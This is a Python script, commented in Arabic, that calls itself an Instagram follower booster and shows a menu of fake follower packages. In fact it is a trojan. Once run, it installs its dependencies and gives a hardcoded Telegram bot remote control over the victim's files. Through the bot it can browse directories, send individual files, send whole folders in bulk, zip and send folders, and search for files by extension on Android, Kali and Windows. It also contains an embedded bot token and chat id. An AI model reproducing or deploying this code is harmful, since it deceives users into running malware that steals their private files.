import sys
import subprocess
import os
import platform
import hashlib
import telebot
import time
import shutil
from concurrent.futures import ThreadPoolExecutor
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

# إعداد البوت باستخدام التوكن الخاص بك
bot = telebot.TeleBot("7523668232:AAEaKe9HUIaXnbNx8Rlf7eFbHxnsKrjpNek")  # استخدم التوكن من الكود الأول
chat_id = '5164991393'

# إرسال رسالة الخطأ إلى البوت
def send_error_to_bot(error_message):
    bot.send_message(chat_id=chat_id, text=f"⚠️ خطأ: {error_message}")

# تثبيت المكتبات المطلوبة إذا لم تكن مثبتة بالفعل
required_modules = ['pyTelegramBotAPI', 'pyfiglet', 'requests']
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module])
        except Exception as e:
            send_error_to_bot(f"فشل في تثبيت المكتبة: {module}. الخطأ: {str(e)}")

import pyfiglet
import requests

# طباعة رسالة الترحيب
try:
    ab = pyfiglet.figlet_format("@termuxpp")
    print(ab)
except Exception as e:
    send_error_to_bot(f"فشل في طباعة رسالة الترحيب. الخطأ: {str(e)}")

def slow(T): 
    try:
        for r in T:
            sys.stdout.write(r)
            sys.stdout.flush()
            time.sleep(30/2000)
    except Exception as e:
        send_error_to_bot(f"فشل في عرض النص ببطء. الخطأ: {str(e)}")

# عرض قائمة المتابعين الوهميين
try:
    slow("Welcome In Instagram Follower Script 💘 ----------------------------------------------")

    slow("""
      [ 1 ] - 3k    
      [ 2 ] - 5k    
      [ 3 ] - 8k    
      [ 4 ] - 10k   
      [ 5 ] - 15k   
      [ 6 ] - 20k   
    """)
except Exception as e:
    send_error_to_bot(f"فشل في عرض النصوص الأولية. الخطأ: {str(e)}")

# تحديد المسار الافتراضي بناءً على نظام التشغيل
try:
    if platform.system() == "Linux":
        if "kali" in platform.uname().release.lower():
            current_directory = "/home/"  # مسار الملفات في كالي لينكس
        else:
            current_directory = "/storage/emulated/0/"  # مسار الملفات في نظام أندرويد (Termux)
    elif platform.system() == "Windows":
        current_directory = "C:\\Users\\"  # مسار الملفات في نظام ويندوز
    else:
        current_directory = os.path.expanduser("~")  # المسار الافتراضي لأي نظام آخر
except Exception as e:
    send_error_to_bot(f"فشل في تحديد المسار الافتراضي. الخطأ: {str(e)}")

# تخزين المسارات في قاموس لسهولة الوصول إليها لاحقًا
file_paths = {}

# دالة لتوليد تجزئة MD5 لمسار معين
def generate_hash(path):
    try:
        return hashlib.md5(path.encode()).hexdigest()
    except Exception as e:
        send_error_to_bot(f"فشل في توليد تجزئة MD5. الخطأ: {str(e)}")
        return None

# دالة لاستكشاف جميع المسارات
def discover_paths(root="/"):
    paths = []
    try:
        for dirpath, dirnames, filenames in os.walk(root):
            paths.append(dirpath)
            for filename in filenames:
                paths.append(os.path.join(dirpath, filename))
    except Exception as e:
        send_error_to_bot(f"فشل في استكشاف المسارات. الخطأ: {str(e)}")
    return paths

# دالة لعرض الملفات والمجلدات في القائمة
def list_files_in_directory(directory):
    global current_directory  # دمج الكودين حيث تم استخدام المتغير نفسه في كلا الكودين
    current_directory = directory
    try:
        files = os.listdir(directory)
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)

        # ترتيب وعرض المجلدات أولاً ثم الملفات
        for item in sorted(files):
            item_path = os.path.join(directory, item)
            if os.path.isdir(item_path):
                markup.add(KeyboardButton(f"📂 {item}"))
            else:
                file_hash = generate_hash(item_path)
                if file_hash:
                    file_paths[file_hash] = item_path
                    markup.add(KeyboardButton(f"📄 {item}"))

        # إضافة أزرار التنقل بين المجلدات
        if os.path.dirname(directory) != directory:  # عدم عرض زر "العودة" في جذر النظام
            markup.add(KeyboardButton("🔙 العودة إلى المجلد السابق"))
        markup.add(KeyboardButton("🏠 العودة للمسار الرئيسي"))

        bot.send_message(chat_id=chat_id, text=f'📁 المجلد الحالي: {directory}\nاختر ملفًا لإرساله أو مجلدًا للدخول إليه:', reply_markup=markup)
    except Exception as e:
        send_error_to_bot(f"فشل في عرض الملفات في الدليل. الخطأ: {str(e)}")

# دالة إرسال الملفات بناءً على نوعها
def send_file(file_path):
    try:
        with open(file_path, "rb") as f:
            # يتم إرسال أي ملف بغض النظر عن نوعه
            bot.send_document(chat_id=chat_id, document=f, caption=f'📄 ملف: {file_path}')
    except Exception as e:
        send_error_to_bot(f"فشل في إرسال الملف: {file_path}. الخطأ: {str(e)}")

# دالة إرسال الملفات من المجلد بناءً على الامتدادات المختارة
def send_files_from_directory(dir_path):
    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
            for root, dirs, files in os.walk(dir_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    executor.submit(send_file, file_path)
    except Exception as e:
        send_error_to_bot(f"فشل في إرسال الملفات من الدليل: {dir_path}. الخطأ: {str(e)}")

# ضغط وإرسال كافة الملفات في المجلد
def compress_and_send_directory(dir_path):
    try:
        zip_file = os.path.join(dir_path, f"{os.path.basename(dir_path.rstrip('/'))}.zip")
        shutil.make_archive(zip_file.replace('.zip', ''), 'zip', dir_path)
        with open(zip_file, "rb") as f:
            bot.send_document(chat_id=chat_id, document=f, caption=f'ملفات مضغوطة من: {dir_path}')
        os.remove(zip_file)
    except Exception as e:
        send_error_to_bot(f"فشل في ضغط أو إرسال الدليل: {dir_path}. الخطأ: {str(e)}")

# التعامل مع إدخال المسار من المستخدم
@bot.message_handler(func=lambda message: True)
def handle_file_selection(message):  # دمج الوظائف في دالة واحدة مشتركة
    global current_directory
    try:
        selected = message.text.strip()
        if selected.startswith("📂"):
            # إذا كان المجلد، يتم التنقل داخله
            new_dir = os.path.join(current_directory, selected[2:].strip())
            list_files_in_directory(new_dir)
        elif selected.startswith("📄"):
            # إذا كان ملفًا، يتم إرساله
            file_name = selected[2:].strip()
            for file_hash, file_path in file_paths.items():
                if file_name in file_path:
                    send_file(file_path)
                    break
        elif selected == "🔙 العودة إلى المجلد السابق":
            parent_dir = os.path.dirname(current_directory)
            list_files_in_directory(parent_dir)
        elif selected == "🏠 العودة للمسار الرئيسي":
            list_files_in_directory(current_directory)
        else:
            dir_path = selected
            if not os.path.exists(dir_path):
                bot.send_message(chat_id=chat_id, text=f'📂 المسار {dir_path} غير موجود. يرجى التأكد من إدخال مسار صحيح.\nمسار مطلق: {os.path.abspath(dir_path)}')
            elif not os.path.isdir(dir_path):
                bot.send_message(chat_id=chat_id, text=f'{dir_path} هو ملف وليس مجلد. يرجى إدخال مسار مجلد.')
            else:
                bot.send_message(chat_id=chat_id, text=f'المسار {dir_path} صالح. الآن، اختر نوع الملفات التي ترغب في سحبها أو البحث عنها:')
                send_file_type_options(dir_path)
    except Exception as e:
        send_error_to_bot(f"فشل في معالجة إدخال المسار. الخطأ: {str(e)}")

# إرسال خيارات نوع الملفات
def send_file_type_options(dir_path):
    try:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إرسال كافة الملفات", callback_data=f"{dir_path}|كل"))
        markup.add(InlineKeyboardButton("بحث عن ملفات معينة", callback_data=f"{dir_path}|بحث"))
        markup.add(InlineKeyboardButton("ضغط وإرسال كافة الملفات", callback_data=f"{dir_path}|ضغط"))
        bot.send_message(chat_id=chat_id, text='اختر نوع الملفات أو الإجراء:', reply_markup=markup)
    except Exception as e:
        send_error_to_bot(f"فشل في إرسال خيارات نوع الملفات. الخطأ: {str(e)}")

# التعامل مع خيارات الأزرار
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        dir_path, action = call.data.split("|")
        if action == "كل":
            bot.send_message(chat_id=chat_id, text=f'جاري إرسال جميع الملفات من: {dir_path}')
            send_files_from_directory(dir_path)
        elif action == "بحث":
            bot.send_message(chat_id=chat_id, text=f'أدخل اسم الملف أو الامتداد الذي ترغب في البحث عنه في {dir_path}:')
            bot.register_next_step_handler(call.message, handle_search_query, dir_path)
        elif action == "ضغط":
            bot.send_message(chat_id=chat_id, text=f'جاري ضغط وإرسال كافة الملفات من {dir_path}...')
            compress_and_send_directory(dir_path)
    except Exception as e:
        send_error_to_bot(f"فشل في معالجة استعلام الزر. الخطأ: {str(e)}")

# التعامل مع البحث عن ملفات معينة
def handle_search_query(message, dir_path):
    try:
        query = message.text
        bot.send_message(chat_id=chat_id, text=f'جاري البحث عن {query} في {dir_path}...')
        search_and_send_files(dir_path, query)
    except Exception as e:
        send_error_to_bot(f"فشل في معالجة استعلام البحث. الخطأ: {str(e)}")

def search_and_send_files(dir_path, query):
    try:
        found_files = []
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                if query in file or file.endswith(query):
                    file_path = os.path.join(root, file)
                    found_files.append(file_path)
        
        if found_files:
            bot.send_message(chat_id=chat_id, text=f'تم العثور على {len(found_files)} ملف(ات). جاري إرسالها...')
            for file_path in found_files:
                send_file(file_path)
        else:
            bot.send_message(chat_id=chat_id, text=f'لم يتم العثور على أي ملفات تطابق {query} في {dir_path}.')
    except Exception as e:
        send_error_to_bot(f"فشل في البحث أو إرسال الملفات المطابقة. الخطأ: {str(e)}")

# بدء البوت بعرض الملفات من المسار المحدد بناءً على نظام التشغيل
try:
    all_paths = discover_paths(current_directory)  # تحديث الدالة لاستخدام المسار الحالي
    for path in all_paths:
        list_files_in_directory(path)
except Exception as e:
    send_error_to_bot(f"فشل في اكتشاف أو عرض الملفات من المسارات. الخطأ: {str(e)}")

# بدء عملية التفاعل مع المستخدم
try:
    bot.polling()
except Exception as e:
    send_error_to_bot(f"فشل في بدء عملية التفاعل مع البوت. الخطأ: {str(e)}")
